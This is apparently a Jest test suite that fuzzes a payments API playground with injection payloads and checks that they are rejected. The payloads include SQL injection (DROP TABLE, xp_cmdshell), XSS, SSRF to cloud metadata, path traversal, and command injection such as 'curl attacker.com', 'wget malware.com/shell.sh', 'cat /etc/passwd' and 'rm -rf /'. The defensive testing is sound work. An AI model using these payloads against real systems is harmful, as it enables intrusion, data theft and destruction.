/**
 * Brique B118bis: Fuzzing & Injection Defense Tests
 * Tests de défense contre les injections et payloads malicieux
 */

import request from 'supertest';
import app from '../../../brique-117/playground/src/server';

describe('Fuzzing & injection defense', () => {
  const token = process.env.DEV_TOKEN || 'test-dev-token';

  describe('SQL Injection Attempts', () => {
    const sqlPayloads = [
      "' OR 1=1 --",
      "'; DROP TABLE playground_sessions; --",
      "1' UNION SELECT * FROM users--",
      "admin'--",
      "' OR 'a'='a",
      "'; EXEC xp_cmdshell('dir'); --",
      "1; UPDATE users SET role='admin'--"
    ];

    for (const payload of sqlPayloads) {
      it(`rejects SQL injection payload: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: { amount: payload },
            sandboxTargetHost: 'http://localhost:4001'
          });

        // Should either reject (400/422) or sanitize
        expect([400, 422, 200]).toContain(res.status);

        if (res.status === 200) {
          // If accepted, verify no SQL was executed
          expect(res.body).not.toContain('DROP');
          expect(res.body).not.toContain('UNION');
        }
      });
    }

    it('rejects SQL injection in path parameter', async () => {
      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: 'GET',
          path: "/v1/payments/pay_123' OR 1=1--",
          sandboxTargetHost: 'http://localhost:4001'
        });

      expect([400, 422, 200]).toContain(res.status);
    });

    it('rejects SQL injection in session ID', async () => {
      const res = await request(app)
        .post('/api/playground/save')
        .set('Authorization', `Bearer ${token}`)
        .send({
          sessionId: "session'; DROP TABLE playground_sessions;--"
        });

      expect([400, 422]).toContain(res.status);
    });
  });

  describe('NoSQL Injection Attempts', () => {
    const noSqlPayloads = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$or":[{},{"a":"a"}]}',
      '{"$where":"sleep(1000)"}',
      '{"$regex":".*"}',
      '{"__proto__":{"admin":true}}'
    ];

    for (const payload of noSqlPayloads) {
      it(`rejects NoSQL injection payload: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: payload,
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 200]).toContain(res.status);
      });
    }
  });

  describe('XSS (Cross-Site Scripting) Attempts', () => {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<ScRiPt>alert(1)</ScRiPt>'
    ];

    for (const payload of xssPayloads) {
      it(`sanitizes XSS payload: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: { description: payload },
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 200]).toContain(res.status);

        if (res.status === 200) {
          // Verify payload is sanitized
          const responseStr = JSON.stringify(res.body);
          expect(responseStr).not.toContain('<script>');
          expect(responseStr).not.toContain('onerror');
          expect(responseStr).not.toContain('javascript:');
        }
      });
    }
  });

  describe('Command Injection Attempts', () => {
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(whoami)',
      '; rm -rf /',
      '&& curl attacker.com',
      '|| wget malware.com/shell.sh'
    ];

    for (const payload of commandPayloads) {
      it(`rejects command injection: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: { customer_note: payload },
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 200]).toContain(res.status);
      });
    }
  });

  describe('Path Traversal Attempts', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file:///etc/passwd',
      '/var/log/../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ];

    for (const payload of pathTraversalPayloads) {
      it(`rejects path traversal: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'GET',
            path: `/v1/${payload}`,
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 404]).toContain(res.status);
      });
    }
  });

  describe('SSRF (Server-Side Request Forgery) Attempts', () => {
    const ssrfUrls = [
      'http://169.254.169.254/latest/meta-data',
      'http://localhost:22',
      'http://127.0.0.1:6379',
      'http://0.0.0.0:8080',
      'http://[::1]:8080',
      'file:///etc/passwd',
      'gopher://localhost:6379/_*1%0d%0a',
      'http://internal-service.local'
    ];

    for (const url of ssrfUrls) {
      it(`rejects SSRF attempt: ${url}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: { webhook_url: url },
            sandboxTargetHost: url
          });

        expect([400, 422]).toContain(res.status);
      });
    }
  });

  describe('Prototype Pollution Attempts', () => {
    const pollutionPayloads = [
      { '__proto__': { admin: true } },
      { 'constructor': { 'prototype': { admin: true } } },
      JSON.parse('{"__proto__":{"admin":true}}')
    ];

    for (const payload of pollutionPayloads) {
      it(`prevents prototype pollution: ${JSON.stringify(payload)}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: payload,
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 200]).toContain(res.status);

        // Verify no pollution occurred
        expect({}.admin).toBeUndefined();
        expect(Object.prototype.admin).toBeUndefined();
      });
    }
  });

  describe('Large Payload DoS Attempts', () => {
    it('rejects extremely large JSON payload', async () => {
      const hugePayload = 'A'.repeat(10 * 1024 * 1024); // 10MB

      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: 'POST',
          path: '/v1/payments',
          body: { data: hugePayload },
          sandboxTargetHost: 'http://localhost:4001'
        });

      expect([413, 400]).toContain(res.status);
    });

    it('rejects deeply nested JSON (billion laughs)', async () => {
      let nested: any = { value: 1 };
      for (let i = 0; i < 1000; i++) {
        nested = { child: nested };
      }

      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: 'POST',
          path: '/v1/payments',
          body: nested,
          sandboxTargetHost: 'http://localhost:4001'
        });

      expect([400, 413, 422]).toContain(res.status);
    });

    it('rejects payload with excessive unicode characters', async () => {
      const unicodeFlood = '🦄'.repeat(100000); // 400KB of emoji

      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: 'POST',
          path: '/v1/payments',
          body: { description: unicodeFlood },
          sandboxTargetHost: 'http://localhost:4001'
        });

      expect([413, 400, 422]).toContain(res.status);
    });
  });

  describe('Header Injection Attempts', () => {
    const headerInjectionPayloads = [
      'test\r\nX-Injected: true',
      'test\nSet-Cookie: admin=true',
      'test%0d%0aX-Injected: true'
    ];

    for (const payload of headerInjectionPayloads) {
      it(`rejects header injection: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .set('X-Custom-Header', payload)
          .send({
            method: 'GET',
            path: '/healthz',
            sandboxTargetHost: 'http://localhost:4001'
          });

        // Should either reject or sanitize
        expect([400, 422, 200]).toContain(res.status);
      });
    }
  });

  describe('Format String Attacks', () => {
    const formatStringPayloads = [
      '%s%s%s%s%s%s%s%s%s%s',
      '%x%x%x%x%x%x%x%x',
      '%n%n%n%n%n',
      '${7*7}',
      '#{7*7}',
      '{{7*7}}'
    ];

    for (const payload of formatStringPayloads) {
      it(`handles format string safely: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: '/v1/payments',
            body: { format: payload },
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 200]).toContain(res.status);

        if (res.status === 200) {
          // Verify no template injection occurred
          expect(res.body).not.toContain('49');
        }
      });
    }
  });

  describe('Null Byte Injection', () => {
    const nullBytePayloads = [
      'filename.txt\0.php',
      'user%00admin',
      'path/to/file\u0000.exe'
    ];

    for (const payload of nullBytePayloads) {
      it(`rejects null byte injection: ${payload}`, async () => {
        const res = await request(app)
          .post('/api/playground/run')
          .set('Authorization', `Bearer ${token}`)
          .send({
            method: 'POST',
            path: `/v1/${payload}`,
            sandboxTargetHost: 'http://localhost:4001'
          });

        expect([400, 422, 404]).toContain(res.status);
      });
    }
  });

  describe('Edge Case Inputs', () => {
    it('handles empty strings gracefully', async () => {
      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: '',
          path: '',
          body: '',
          sandboxTargetHost: ''
        });

      expect([400, 422]).toContain(res.status);
    });

    it('handles null values gracefully', async () => {
      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: null,
          path: null,
          body: null,
          sandboxTargetHost: null
        });

      expect([400, 422]).toContain(res.status);
    });

    it('handles undefined values gracefully', async () => {
      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({});

      expect([400, 422]).toContain(res.status);
    });

    it('handles non-string types in string fields', async () => {
      const res = await request(app)
        .post('/api/playground/run')
        .set('Authorization', `Bearer ${token}`)
        .send({
          method: 123,
          path: true,
          body: ['array'],
          sandboxTargetHost: { object: 'value' }
        });

      expect([400, 422]).toContain(res.status);
    });
  });
});
